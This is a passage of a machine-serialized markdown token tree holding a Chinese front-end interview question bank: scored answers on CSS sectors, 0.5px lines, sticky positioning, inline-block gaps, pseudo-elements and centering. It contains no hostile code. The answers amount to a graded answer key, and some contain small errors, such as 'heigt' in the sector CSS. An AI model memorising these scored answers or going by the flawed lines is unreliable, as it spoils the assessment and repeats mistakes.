针对不同的像素密度，使用 CSS 媒体查询，选择不同精度的图片，以保证图片不会失真；\\n","text":"适配不同像素密度， 针对不同的像素密度，使用 CSS 媒体查询，选择不同精度的图片，以保证图片不会失真；","tokens":[{"type":"text","raw":"适配不同像素密度， 针对不同的像素密度，使用 CSS 媒体查询，选择不同精度的图片，以保证图片不会失真；","text":"适配不同像素密度， 针对不同的像素密度，使用 CSS 媒体查询，选择不同精度的图片，以保证图片不会失真；","escaped":false}]}]},{"type":"list_item","raw":"- 适配不同屏幕大小， 由于不同的屏幕有着不同的逻辑像素大小，所以如果直接使用 px 作为开发单位，会使得开发的页面在某一款手机上可以准确显示，但是在另一款手机上就会失真。为了适配不同屏幕的大小，应按照比例来还原设计稿的内容。\\n\\n","task":false,"loose":true,"text":"适配不同屏幕大小， 由于不同的屏幕有着不同的逻辑像素大小，所以如果直接使用 px 作为开发单位，会使得开发的页面在某一款手机上可以准确显示，但是在另一款手机上就会失真。为了适配不同屏幕的大小，应按照比例来还原设计稿的内容。\\n","tokens":[{"type":"text","raw":"适配不同屏幕大小， 由于不同的屏幕有着不同的逻辑像素大小，所以如果直接使用 px 作为开发单位，会使得开发的页面在某一款手机上可以准确显示，但是在另一款手机上就会失真。为了适配不同屏幕的大小，应按照比例来还原设计稿的内容。\\n","text":"适配不同屏幕大小， 由于不同的屏幕有着不同的逻辑像素大小，所以如果直接使用 px 作为开发单位，会使得开发的页面在某一款手机上可以准确显示，但是在另一款手机上就会失真。为了适配不同屏幕的大小，应按照比例来还原设计稿的内容。","tokens":[{"type":"text","raw":"适配不同屏幕大小， 由于不同的屏幕有着不同的逻辑像素大小，所以如果直接使用 px 作为开发单位，会使得开发的页面在某一款手机上可以准确显示，但是在另一款手机上就会失真。为了适配不同屏幕的大小，应按照比例来还原设计稿的内容。","text":"适配不同屏幕大小， 由于不同的屏幕有着不同的逻辑像素大小，所以如果直接使用 px 作为开发单位，会使得开发的页面在某一款手机上可以准确显示，但是在另一款手机上就会失真。为了适配不同屏幕的大小，应按照比例来还原设计稿的内容。","escaped":false}]}]},{"type":"list_item","raw":"- 为了能让页面的尺寸自适应，可以使用 rem，em，vw，vh 等相对单位。","task":false,"loose":true,"text":"为了能让页面的尺寸自适应，可以使用 rem，em，vw，vh 等相对单位。","tokens":[{"type":"text","raw":"为了能让页面的尺寸自适应，可以使用 rem，em，vw，vh 等相对单位。","text":"为了能让页面的尺寸自适应，可以使用 rem，em，vw，vh 等相对单位。","tokens":[{"type":"text","raw":"为了能让页面的尺寸自适应，可以使用 rem，em，vw，vh 等相对单位。","text":"为了能让页面的尺寸自适应，可以使用 rem，em，vw，vh 等相对单位。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 22 .实现一个扇形\\n\\n","depth":2,"text":"22 .实现一个扇形","tokens":[{"type":"text","raw":"22 .实现一个扇形","text":"22 .实现一个扇形","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 用CSS实现扇形的思路和三角形基本一致，就是多了一个圆角的样式，实现一个90°的扇形：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 用CSS实现扇形的思路和三角形基本一致，就是多了一个圆角的样式，实现一个90°的扇形：","task":false,"loose":false,"text":"用CSS实现扇形的思路和三角形基本一致，就是多了一个圆角的样式，实现一个90°的扇形：","tokens":[{"type":"text","raw":"用CSS实现扇形的思路和三角形基本一致，就是多了一个圆角的样式，实现一个90°的扇形：","text":"用CSS实现扇形的思路和三角形基本一致，就是多了一个圆角的样式，实现一个90°的扇形：","tokens":[{"type":"text","raw":"用CSS实现扇形的思路和三角形基本一致，就是多了一个圆角的样式，实现一个90°的扇形：","text":"用CSS实现扇形的思路和三角形基本一致，就是多了一个圆角的样式，实现一个90°的扇形：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```css\\ndiv{\\n    border: 100px solid transparent;\\n    width: 0;\\n    heigt: 0;\\n    border-radius: 100px;\\n    border-top-color: red;\\n}\\n```","lang":"css","text":"div{\\n    border: 100px solid transparent;\\n    width: 0;\\n    heigt: 0;\\n    border-radius: 100px;\\n    border-top-color: red;\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 23. 画一条0.5px的线\\n\\n","depth":2,"text":"23. 画一条0.5px的线","tokens":[{"type":"text","raw":"23. 画一条0.5px的线","text":"23. 画一条0.5px的线","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 采用transform: scale()的方式，该方法用来定义元素的2D 缩放转换：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 采用transform: scale()的方式，该方法用来定义元素的2D 缩放转换：","task":false,"loose":false,"text":"采用transform: scale()的方式，该方法用来定义元素的2D 缩放转换：","tokens":[{"type":"text","raw":"采用transform: scale()的方式，该方法用来定义元素的2D 缩放转换：","text":"采用transform: scale()的方式，该方法用来定义元素的2D 缩放转换：","tokens":[{"type":"text","raw":"采用transform: scale()的方式，该方法用来定义元素的2D 缩放转换：","text":"采用transform: scale()的方式，该方法用来定义元素的2D 缩放转换：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```css\\ntransform: scale(0.5,0.5);\\n```","lang":"css","text":"transform: scale(0.5,0.5);"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 采用meta viewport的方式","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 采用meta viewport的方式","task":false,"loose":false,"text":"采用meta viewport的方式","tokens":[{"type":"text","raw":"采用meta viewport的方式","text":"采用meta viewport的方式","tokens":[{"type":"text","raw":"采用meta viewport的方式","text":"采用meta viewport的方式","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```html\\n<meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=0.5, minimum-scale=0.5, maximum-scale=0.5\\"/>\\n```","lang":"html","text":"<meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=0.5, minimum-scale=0.5, maximum-scale=0.5\\"/>"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 24. 对 sticky 定位的理解\\n\\n","depth":2,"text":"24. 对 sticky 定位的理解","tokens":[{"type":"text","raw":"24. 对 sticky 定位的理解","text":"24. 对 sticky 定位的理解","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- sticky 英文字面意思是粘贴，所以可以把它称之为粘性定位。语法：position: sticky; 基于用户的滚动位置来定位。\\n\\n- 粘性定位的元素是依赖于用户的滚动，在 position:relative 与 position:fixed 定位之间切换。它的行为就像 position:relative; 而当页面滚动超出目标区域时，它的表现就像 position:fixed;，它会固定在目标位置。元素定位表现为在跨越特定阈值前为相对定位，之后为固定定位。这个特定阈值指的是 top, right, bottom 或 left\\n之一，换言之，指定 top, right, bottom 或 left 四个阈值其中之一，才可使粘性定位生效。否则其行为与相对定位相同。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- sticky 英文字面意思是粘贴，所以可以把它称之为粘性定位。语法：position: sticky; 基于用户的滚动位置来定位。\\n\\n","task":false,"loose":true,"text":"sticky 英文字面意思是粘贴，所以可以把它称之为粘性定位。语法：position: sticky; 基于用户的滚动位置来定位。\\n","tokens":[{"type":"text","raw":"sticky 英文字面意思是粘贴，所以可以把它称之为粘性定位。语法：position: sticky; 基于用户的滚动位置来定位。\\n","text":"sticky 英文字面意思是粘贴，所以可以把它称之为粘性定位。语法：position: sticky; 基于用户的滚动位置来定位。","tokens":[{"type":"text","raw":"sticky 英文字面意思是粘贴，所以可以把它称之为粘性定位。语法：position: sticky; 基于用户的滚动位置来定位。","text":"sticky 英文字面意思是粘贴，所以可以把它称之为粘性定位。语法：position: sticky; 基于用户的滚动位置来定位。","escaped":false}]}]},{"type":"list_item","raw":"- 粘性定位的元素是依赖于用户的滚动，在 position:relative 与 position:fixed 定位之间切换。它的行为就像 position:relative; 而当页面滚动超出目标区域时，它的表现就像 position:fixed;，它会固定在目标位置。元素定位表现为在跨越特定阈值前为相对定位，之后为固定定位。这个特定阈值指的是 top, right, bottom 或 left\\n之一，换言之，指定 top, right, bottom 或 left 四个阈值其中之一，才可使粘性定位生效。否则其行为与相对定位相同。","task":false,"loose":true,"text":"粘性定位的元素是依赖于用户的滚动，在 position:relative 与 position:fixed 定位之间切换。它的行为就像 position:relative; 而当页面滚动超出目标区域时，它的表现就像 position:fixed;，它会固定在目标位置。元素定位表现为在跨越特定阈值前为相对定位，之后为固定定位。这个特定阈值指的是 top, right, bottom 或 left\\n之一，换言之，指定 top, right, bottom 或 left 四个阈值其中之一，才可使粘性定位生效。否则其行为与相对定位相同。","tokens":[{"type":"text","raw":"粘性定位的元素是依赖于用户的滚动，在 position:relative 与 position:fixed 定位之间切换。它的行为就像 position:relative; 而当页面滚动超出目标区域时，它的表现就像 position:fixed;，它会固定在目标位置。元素定位表现为在跨越特定阈值前为相对定位，之后为固定定位。这个特定阈值指的是 top, right, bottom 或 left\\n\\n之一，换言之，指定 top, right, bottom 或 left 四个阈值其中之一，才可使粘性定位生效。否则其行为与相对定位相同。","text":"粘性定位的元素是依赖于用户的滚动，在 position:relative 与 position:fixed 定位之间切换。它的行为就像 position:relative; 而当页面滚动超出目标区域时，它的表现就像 position:fixed;，它会固定在目标位置。元素定位表现为在跨越特定阈值前为相对定位，之后为固定定位。这个特定阈值指的是 top, right, bottom 或 left\\n之一，换言之，指定 top, right, bottom 或 left 四个阈值其中之一，才可使粘性定位生效。否则其行为与相对定位相同。","tokens":[{"type":"text","raw":"粘性定位的元素是依赖于用户的滚动，在 position:relative 与 position:fixed 定位之间切换。它的行为就像 position:relative; 而当页面滚动超出目标区域时，它的表现就像 position:fixed;，它会固定在目标位置。元素定位表现为在跨越特定阈值前为相对定位，之后为固定定位。这个特定阈值指的是 top, right, bottom 或 left\\n之一，换言之，指定 top, right, bottom 或 left 四个阈值其中之一，才可使粘性定位生效。否则其行为与相对定位相同。","text":"粘性定位的元素是依赖于用户的滚动，在 position:relative 与 position:fixed 定位之间切换。它的行为就像 position:relative; 而当页面滚动超出目标区域时，它的表现就像 position:fixed;，它会固定在目标位置。元素定位表现为在跨越特定阈值前为相对定位，之后为固定定位。这个特定阈值指的是 top, right, bottom 或 left\\n之一，换言之，指定 top, right, bottom 或 left 四个阈值其中之一，才可使粘性定位生效。否则其行为与相对定位相同。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 25. display:inline-block 什么时候会显示间隙？\\n\\n","depth":2,"text":"25. display:inline-block 什么时候会显示间隙？","tokens":[{"type":"text","raw":"25. display:inline-block 什么时候会显示间隙？","text":"25. display:inline-block 什么时候会显示间隙？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 有空格时会有间隙，可以删除空格解决；\\n\\n- margin正值时，可以让margin使用负值解决；\\n\\n- 使用font-size解决，给父元素设置font-size:0，子元素再设置font-size；","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 有空格时会有间隙，可以删除空格解决；\\n\\n","task":false,"loose":true,"text":"有空格时会有间隙，可以删除空格解决；\\n","tokens":[{"type":"text","raw":"有空格时会有间隙，可以删除空格解决；\\n","text":"有空格时会有间隙，可以删除空格解决；","tokens":[{"type":"text","raw":"有空格时会有间隙，可以删除空格解决；","text":"有空格时会有间隙，可以删除空格解决；","escaped":false}]}]},{"type":"list_item","raw":"- margin正值时，可以让margin使用负值解决；\\n\\n","task":false,"loose":true,"text":"margin正值时，可以让margin使用负值解决；\\n","tokens":[{"type":"text","raw":"margin正值时，可以让margin使用负值解决；\\n","text":"margin正值时，可以让margin使用负值解决；","tokens":[{"type":"text","raw":"margin正值时，可以让margin使用负值解决；","text":"margin正值时，可以让margin使用负值解决；","escaped":false}]}]},{"type":"list_item","raw":"- 使用font-size解决，给父元素设置font-size:0，子元素再设置font-size；","task":false,"loose":true,"text":"使用font-size解决，给父元素设置font-size:0，子元素再设置font-size；","tokens":[{"type":"text","raw":"使用font-size解决，给父元素设置font-size:0，子元素再设置font-size；","text":"使用font-size解决，给父元素设置font-size:0，子元素再设置font-size；","tokens":[{"type":"text","raw":"使用font-size解决，给父元素设置font-size:0，子元素再设置font-size；","text":"使用font-size解决，给父元素设置font-size:0，子元素再设置font-size；","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 26. ::before 和 :after 的双冒号和单冒号有什么区别？\\n\\n","depth":2,"text":"26. ::before 和 :after 的双冒号和单冒号有什么区别？","tokens":[{"type":"text","raw":"26. ::before 和 :after 的双冒号和单冒号有什么区别？","text":"26. ::before 和 :after 的双冒号和单冒号有什么区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- 冒号(:)用于CSS3伪类，双冒号(::)用于CSS3伪元素。 （2）::before就是以一个子元素的存在，定义在元素主体内容之前的一个伪元素。并不存在于dom之中，只存在在页面之中。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 冒号(:)用于CSS3伪类，双冒号(::)用于CSS3伪元素。 （2）::before就是以一个子元素的存在，定义在元素主体内容之前的一个伪元素。并不存在于dom之中，只存在在页面之中。","task":false,"loose":false,"text":"冒号(:)用于CSS3伪类，双冒号(::)用于CSS3伪元素。 （2）::before就是以一个子元素的存在，定义在元素主体内容之前的一个伪元素。并不存在于dom之中，只存在在页面之中。","tokens":[{"type":"text","raw":"冒号(:)用于CSS3伪类，双冒号(::)用于CSS3伪元素。 （2）::before就是以一个子元素的存在，定义在元素主体内容之前的一个伪元素。并不存在于dom之中，只存在在页面之中。","text":"冒号(:)用于CSS3伪类，双冒号(::)用于CSS3伪元素。 （2）::before就是以一个子元素的存在，定义在元素主体内容之前的一个伪元素。并不存在于dom之中，只存在在页面之中。","tokens":[{"type":"text","raw":"冒号(:)用于CSS3伪类，双冒号(::)用于CSS3伪元素。 （2）::before就是以一个子元素的存在，定义在元素主体内容之前的一个伪元素。并不存在于dom之中，只存在在页面之中。","text":"冒号(:)用于CSS3伪类，双冒号(::)用于CSS3伪元素。 （2）::before就是以一个子元素的存在，定义在元素主体内容之前的一个伪元素。并不存在于dom之中，只存在在页面之中。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 27. CSS 居中\\n\\n","depth":2,"text":"27. CSS 居中","tokens":[{"type":"text","raw":"27. CSS 居中","text":"27. CSS 居中","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：定位居中**","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：定位居中**","task":false,"loose":false,"text":"**1：定位居中**","tokens":[{"type":"text","raw":"**1：定位居中**","text":"**1：定位居中**","tokens":[{"type":"strong","raw":"**1：定位居中**","text":"1：定位居中","tokens":[{"type":"text","raw":"1：定位居中","text":"1：定位居中","escaped":false}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"①已知大小的元素在屏幕窗口水平垂直都居中","text":"①已知大小的元素在屏幕窗口水平垂直都居中","tokens":[{"type":"text","raw":"①已知大小的元素在屏幕窗口水平垂直都居中","text":"①已知大小的元素在屏幕窗口水平垂直都居中","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```html\\n<!DOCTYPE html>\\n<html lang=\\"en\\">\\n<head>\\n    <meta charset=\\"UTF-8\\">\\n    <meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1.0\\">\\n    <meta http-equiv=\\"X-UA-Compatible\\" content=\\"ie=edge\\">\\n    <title></title>\\n    <style>\\n        .box{\\n            width:100px;\\n            height:100px;\\n            background-color: aqua;\\n            position:fixed;\\n            left:50%;\\n            top:50%;\\n            margin-left:-50px;\\n            margin-top:-50px;\\n        }\\n    </style>\\n</head>\\n<body>\\n    <div class=\\"box\\">\\n\\n    </div>\\n</body>\\n</html>\\n```","lang":"html","text":"<!DOCTYPE html>\\n<html lang=\\"en\\">\\n<head>\\n    <meta charset=\\"UTF-8\\">\\n    <meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1.0\\">\\n    <meta http-equiv=\\"X-UA-Compatible\\" content=\\"ie=edge\\">\\n    <title></title>\\n    <style>\\n        .box{\\n            width:100px;\\n            height:100px;\\n            background-color: aqua;\\n            position:fixed;\\n            left:50%;\\n            top:50%;\\n            margin-left:-50px;\\n            margin-top:-50px;\\n        }\\n    </style>\\n</head>\\n<body>\\n    <div class=\\"box\\">\\n\\n    </div>\\n</body>\\n</html>"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"②未知大小的元素在屏幕窗口水平垂直都居中","text":"②未知大小的元素在屏幕窗口水平垂直都居中","tokens":[{"type":"text","raw":"②未知大小的元素在屏幕窗口水平垂直都居中","text":"②未知大小的元素在屏幕窗口水平垂直都居中","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```html\\n<!DOCTYPE html>\\n<html lang=\\"en\\">\\n<head>\\n    <meta charset=\\"UTF-8\\">\\n    <meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1.0\\">\\n    <meta http-equiv=\\"X-UA-Compatible\\" content=\\"ie=edge\\">\\n    <title></title>\\n    <style>\\n        .box{\\n            position:fixed;\\n            left:0;\\n            top:0;\\n            right:0;\\n            bottom:0;\\n            margin:auto;\\n        }\\n    </style>\\n</head>\\n<body>\\n    <div class=\\"box\\">\\n\\n    </div>\\n</body>\\n</html>\\n```","lang":"html","text":"<!DOCTYPE html>\\n<html lang=\\"en\\">\\n<head>\\n    <meta charset=\\"UTF-8\\">\\n    <meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1.0\\">\\n    <meta http-equiv=\\"X-UA-Compatible\\" content=\\"ie=edge\\">\\n    <title></title>\\n    <style>\\n        .box{\\n            position:fixed;\\n            left:0;\\n            top:0;\\n            right:0;\\n            bottom:0;\\n            margin:auto;\\n        }\\n    </style>\\n</head>\\n<body>\\n    <div class=\\"box\\">\\n\\n    </div>\\n</body>\\n</html>"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：子元素在父元素中居中**","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：子元素在父元素中居中**","task":false,"loose":false,"text":"**1：子元素在父元素中居中**","tokens":[{"type":"text","raw":"**1：子元素在父元素中居中**","text":"**1：子元素在父元素中居中**","tokens":[{"type":"strong","raw":"**1：子元素在父元素中居中**","text":"1：子元素在父元素中居中","tokens":[{"type":"text","raw":"1：子元素在父元素中居中","text":"1：子元素在父元素中居中","escaped":false}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"①已知大小的子元素在父元素中居中","text":"①已知大小的子元素在父元素中居中","tokens":[{"type":"text","raw":"①已知大小的子元素在父元素中居中","text":"①已知大小的子元素在父元素中居中","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```css\\n    父元素{\\n        /* 相对定位 */\\n        position: relative;\\n    }\\n    子元素{\\n        width:100px;\\n        height:100px;\\n        /* 绝对定位 */\\n        position:absolute;\\n        left:50%;\\n        top:50%;\\n        margin-left:-50px;\\n        margin-top:-50px;\\n    }\\n```","lang":"css","text":"    父元素{\\n        /* 相对定位 */\\n        position: relative;\\n    }\\n    子元素{\\n        width:100px;\\n        height:100px;\\n        /* 绝对定位 */\\n        position:absolute;\\n        left:50%;\\n        top:50%;\\n        margin-left:-50px;\\n        margin-top:-50px;\\n    }"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"②未知大小的子元素在父元素中居中","text":"②未知大小的子元素在父元素中居中","tokens":[{"type":"text","raw":"②未知大小的子元素在父元素中居中","text":"②未知大小的子元素在父元素中居中","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```css\\n  父元素{\\n      /* 相对定位 */\\n      position: relative;\\n  }\\n  子元素{\\n      /* 绝对定位 */\\n      position:absolute;\\n      left:0;\\n      top:0;\\n      right:0;\\n      bottom:0;\\n      margin:auto;\\n  }\\n```","lang":"css","text":"  父元素{\\n      /* 相对定位 */\\n      position: relative;\\n  }\\n  子元素{\\n      /* 绝对定位 */\\n      position:absolute;\\n      left:0;\\n      top:0;\\n      right:0;\\n      bottom:0;\\n      margin:auto;\\n  }"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：使用弹性布局**","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：使用弹性布局**","task":false,"loose":false,"text":"**1：使用弹性布局**","tokens":[{"type":"text","raw":"**1：使用弹性布局**","text":"**1：使用弹性布局**","tokens":[{"type":"strong","raw":"**1：使用弹性布局**","text":"1：使用弹性布局","tokens":[{"type":"text","raw":"1：使用弹性布局","text":"1：使用弹性布局","escaped":false}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"① 使用flex布局的方式实现未知大小元素在屏幕窗口水平垂直都居中","text":"① 使用flex布局的方式实现未知大小元素在屏幕窗口水平垂直都居中","tokens":[{"type":"text","raw":"① 使用flex布局的方式实现未知大小元素在屏幕窗口水平垂直都居中","text":"① 使用flex布局的方式实现未知大小元素在屏幕窗口水平垂直都居中","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```css\\n  html,body{\\n      height:100%;\\n  }\\n  /* 让html和body的高度为屏幕窗口的高度（窗口高度自适应） */\\n  body{\\n      display:flex;\\n      justify-content:center;\\n      align-items:center;\\n  }\\n```","lang":"css","text":"  html,body{\\n      height:100%;\\n  }\\n  /* 让html和body的高度为屏幕窗口的高度（窗口高度自适应） */\\n  body{\\n      display:flex;\\n      justify-content:center;\\n      align-items:center;\\n  }"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"② 使用flex布局的方式实现未知大小的子元素在父元素中水平垂直都居中**","text":"② 使用flex布局的方式实现未知大小的子元素在父元素中水平垂直都居中**","tokens":[{"type":"text","raw":"② 使用flex布局的方式实现未知大小的子元素在父元素中水平垂直都居中**","text":"② 使用flex布局的方式实现未知大小的子元素在父元素中水平垂直都居中**","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```css\\n  父元素 {\\n      display:flex;\\n      justify-content:center;\\n      align-items:center;\\n  }\\n    \\n```","lang":"css","text":"  父元素 {\\n      display:flex;\\n      justify-content:center;\\n      align-items:center;\\n  }\\n    "},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：使用css3变形来实现**","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 